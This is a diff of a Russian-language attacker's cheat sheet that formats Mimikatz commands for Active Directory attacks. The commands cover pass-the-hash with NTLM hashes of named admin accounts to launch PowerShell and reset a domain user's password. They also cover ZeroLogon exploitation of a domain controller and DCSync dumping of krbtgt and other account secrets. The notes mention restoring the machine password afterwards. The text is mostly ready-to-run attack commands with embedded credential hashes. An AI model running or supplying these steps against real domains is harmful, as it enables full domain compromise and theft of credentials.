@@ -43,10 +43,10 @@
 - требует права для фальсификации токена;
 
 1. Запускаем удаленный powershell.
-sekurlsa::pth /domain:company.ru /user:kstepanovAdm /ntlm:39aced871bfb9485b15c0ddcd3b456f3 /run:"powershell.exe"
+`sekurlsa::pth /domain:company.ru /user:kstepanovAdm /ntlm:39aced871bfb9485b15c0ddcd3b456f3 /run:"powershell.exe"`
 
 2. Меняем пароль пользователя в домене. Пароль должен удовлетворять текущей парольной политике!
-sekurlsa::pth /domain:company.ru /user:eborisenkoAdm /ntlm:84a09c7fe2da7625051ed8dbae888073 /run:"net user buhramin Qwerty15 /domain"
+`sekurlsa::pth /domain:company.ru /user:eborisenkoAdm /ntlm:84a09c7fe2da7625051ed8dbae888073 /run:"net user buhramin Qwerty15 /domain"`
 
 # ZeroLogon
 Входные данные:
@@ -59,17 +59,17 @@ sekurlsa::pth /domain:company.ru /user:eborisenkoAdm /ntlm:84a09c7fe2da7625051ed
 - достаточно прав обычного пользователя.
 
 1. Попытка провести атаку dcsync.
-lsadump::dcsync /domain:company.ru /dc:dc.company.ru /user:krbtgt /authuser:dc$ /authdomain:company.ru /authpassword:"" /authntlm
+`lsadump::dcsync /domain:company.ru /dc:dc.company.ru /user:krbtgt /authuser:dc$ /authdomain:company.ru /authpassword:"" /authntlm`
 Естественно, не успех.
 
 2. Проверка возможности эксплуатации данной уязвимости.
-lsadump::zerologon /target:dc.company.ru /account:dc$
+`lsadump::zerologon /target:dc.company.ru /account:dc$`
 
 3. Экслуатация.
-lsadump::zerologon /target:dc.company.ru /account:dc$ /exploit
+`lsadump::zerologon /target:dc.company.ru /account:dc$ /exploit`
 
 4. Атака dcsync.
-lsadump::dcsync /domain:company.ru /dc:dc.company.ru /user:<<<username>>> /authuser:dc$ /authdomain:company.ru /authpassword:"" /authntlm
+`lsadump::dcsync /domain:company.ru /dc:dc.company.ru /user:<<<username>>> /authuser:dc$ /authdomain:company.ru /authpassword:"" /authntlm`
 
 5. Восстановление пароля машины штатными средствами (https://winitpro.ru/index.php/2014/09/18/vosstanovlenie-doveritelnyx-otnoshenij-bez-perevvoda-v-domen/):
 	5.1. Можно проверить, что связи с dc нет, с помощью nltest /sc_verify:<имя_домена>
